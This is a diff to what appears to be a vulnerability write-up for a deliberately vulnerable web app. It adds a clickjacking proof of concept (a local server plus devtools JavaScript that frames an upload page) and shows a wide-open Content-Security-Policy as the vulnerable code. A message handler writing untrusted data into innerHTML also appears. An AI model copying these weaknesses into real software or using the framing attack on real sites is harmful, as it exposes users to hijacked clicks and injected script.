@@ -130,6 +130,29 @@ window.addEventListener('message', function(e)
   document.getElementById('test').innerHTML = e.data;
 })
 ```
+## Clickjacking
+Exploit/PoC:
+
+```sh
+# Run simple server with page clickjacking.html
+$ python3 -m http.server 8000
+# Go to web http://localhost:8000/clickjacking.html
+
+# Via devtools
+var iframe = document.createElement('iframe');
+iframe.src = 'http://192.168.19.1:8888/upload'; // Replace with your desired URL
+iframe.style.width = '400px';
+iframe.style.height = '400px';
+document.body.appendChild(iframe);
+```
+
+Vulnerable code:
+```python
+# security/CSP.py
+resp.headers['Content-Security-Policy'] = "default-src *;" \
+                                          "frame-src *;"
+```
+
 ## Authentication bypass
 Exploit/PoC:
 ```
